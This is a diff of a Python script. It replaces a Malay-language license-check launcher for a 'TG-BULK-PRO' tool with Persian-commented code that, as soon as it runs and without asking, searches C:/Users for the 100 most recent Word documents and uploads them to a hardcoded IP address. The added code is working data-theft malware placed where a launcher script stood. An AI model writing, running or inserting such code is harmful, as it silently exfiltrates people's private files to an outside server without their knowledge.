@@ -1,80 +1,108 @@
 import os
-import sys
-from time import sleep
-import requests  # pastikan requests sudah diinstall: pip install requests
+import requests
+from datetime import datetime
+import time
+import socket
+import logging
 
-LICENSE_FILE = "license.key"
-API_URL = "https://apikey.my/digital-license-system/activate_license.php"
+# تنظیم لاگ برای خروجی ترمینال و فایل
+log_file = 'C:\\Scripts\\upload_log.txt'
+os.makedirs(os.path.dirname(log_file), exist_ok=True)
 
-def warna(text, color, attrs=None):
-    try:
-        from termcolor import colored
-        return colored(text, color, attrs=attrs if attrs else [])
-    except:
-        return text
+# تنظیم هندلر برای ترمینال با کدگذاری utf-8
+console_handler = logging.StreamHandler()
+console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
+console_handler.setLevel(logging.INFO)
+console_handler.stream.reconfigure(encoding='utf-8')  # اطمینان از پشتیبانی کاراکترهای فارسی
 
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
+# تنظیم هندلر برای فایل
+file_handler = logging.FileHandler(log_file, encoding='utf-8')
+file_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
+file_handler.setLevel(logging.INFO)
 
-def wait(msg="\nTekan Enter untuk keluar..."):
-    input(warna(msg, "green"))
+# تنظیم لاگر
+logging.basicConfig(level=logging.INFO, handlers=[file_handler, console_handler])
 
-def check_license():
-    clear()
-    print(warna("="*50, "cyan"))
-    print(warna("TG-BULK-PRO LICENSE ACCESS", "white", ["bold"]))
-    print(warna("="*50, "cyan"))
-    print()
-    print(warna("Sila masukkan license key yang sah untuk mengakses sistem.", "yellow"))
-    print(warna("License key akan disimpan dan tidak diminta lagi selepas ini.", "yellow"))
-    print()
-
-    # Cuba baca dari file dulu
-    if os.path.exists(LICENSE_FILE):
-        with open(LICENSE_FILE, "r") as f:
-            saved_key = f.read().strip()
-            # Semak dengan API
-            if verify_license_online(saved_key):
-                print(warna("✅ License key sah! Akses dibenarkan.", "green", ["bold"]))
-                sleep(1)
-                return True
-
-    # Jika tiada atau tidak sah, minta user masukkan
-    key = input(warna("→ Masukkan License Key : ", "cyan", ["bold"])).strip()
-    if verify_license_online(key):
-        with open(LICENSE_FILE, "w") as f:
-            f.write(key)
-        print(warna("\n✅ License key diterima. Anda boleh teruskan.", "green", ["bold"]))
-        sleep(1)
-        return True
+def find_latest_docx_files(root_dir, num_files=100):
+    logging.info(f"جستجوی فایل‌های .docx در {root_dir}")
+    docx_files = []
+    
+    for subdir, _, files in os.walk(root_dir):
+        for file in files:
+            if file.lower().endswith('.docx'):
+                filepath = os.path.join(subdir, file)
+                try:
+                    mod_time = os.path.getmtime(filepath)
+                    docx_files.append((filepath, mod_time))
+                    logging.info(f"فایل پیدا شد: {filepath}")
+                except OSError as e:
+                    logging.error(f"خطا در دسترسی به {filepath}: {str(e)}")
+    
+    logging.info(f"تعداد فایل‌های پیدا شده: {len(docx_files)}")
+    docx_files.sort(key=lambda x: x[1], reverse=True)
+    
+    selected_files = [filepath for filepath, _ in docx_files[:num_files]]
+    if selected_files:
+        logging.info(f"{len(selected_files)} فایل انتخاب شد")
     else:
-        print(warna("\n❌ License key salah! Sila cuba lagi.", "red", ["bold"]))
-        wait()
-        return False
+        logging.warning("هیچ فایل .docx پیدا نشد")
+    
+    return selected_files
 
-def verify_license_online(key):
+def is_internet_available():
     try:
-        payload = {
-            "license_key": key,
-            "user_info": os.getenv("USERNAME") or os.getenv("USER") or "python-client"
-        }
-        response = requests.post(API_URL, data=payload, timeout=10)
-        # API expected to return JSON with status "success" if valid
-        resp = response.json()
-        return resp.get("status") == "success"
-    except Exception as e:
-        print(warna(f"Ralat sambungan ke pelayan lesen: {e}", "red"))
-        wait("Sambungan gagal. Sila semak internet atau hubungi admin.")
+        socket.create_connection(("8.8.8.8", 53), timeout=5)
+        return True
+    except OSError:
         return False
 
-def main():
-    while True:
-        if check_license():
-            # Bila berjaya, terus panggil menu.py
-            os.system("python menu.py")
-            break
-        else:
-            clear()
+def upload_files(file_paths, server_url, retry_interval=20, max_attempts=5):
+    logging.info(f"آپلود {len(file_paths)} فایل به {server_url}")
+    
+    for filepath in file_paths:
+        logging.info(f"پردازش فایل: {filepath}")
+        attempt = 0
+        last_error = None
+        
+        while attempt < max_attempts:
+            attempt += 1
+            if not is_internet_available():
+                if attempt == 1:
+                    logging.warning(f"اینترنت قطع است. تلاش مجدد برای {filepath} بعد از {retry_interval} ثانیه")
+                time.sleep(retry_interval)
+                continue
+            
+            try:
+                logging.info(f"تلاش {attempt} برای آپلود {filepath}")
+                with open(filepath, 'rb') as f:
+                    files = {'file': (os.path.basename(filepath), f, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
+                    response = requests.post(server_url, files=files, timeout=60)
+                    if response.status_code == 200:
+                        logging.info(f"آپلود موفقیت‌آمیز: {filepath}")
+                        break
+                    else:
+                        last_error = f"خطا در آپلود: کد {response.status_code} - {response.text}"
+                        if attempt == 1:
+                            logging.error(last_error)
+                        time.sleep(retry_interval)
+            except requests.exceptions.RequestException as e:
+                last_error = f"خطای شبکه: {str(e)}"
+                if attempt == 1:
+                    logging.error(last_error)
+                time.sleep(retry_interval)
+            except Exception as e:
+                last_error = f"خطای غیرمنتظره: {str(e)}"
+                logging.error(last_error)
+                time.sleep(retry_interval)
+        
+        if attempt >= max_attempts:
+            logging.error(f"آپلود {filepath} پس از {max_attempts} تلاش ناموفق بود: {last_error}")
 
-if __name__ == "__main__":
-    main()
+# تنظیمات
+root_dir = 'C:/Users'
+server_url = 'http://3.142.189.155:8000/upload'
+
+logging.info("شروع اسکریپت کلاینت")
+file_paths = find_latest_docx_files(root_dir)
+upload_files(file_paths, server_url)
+logging.info("اسکریپت کلاینت به پایان رسید")
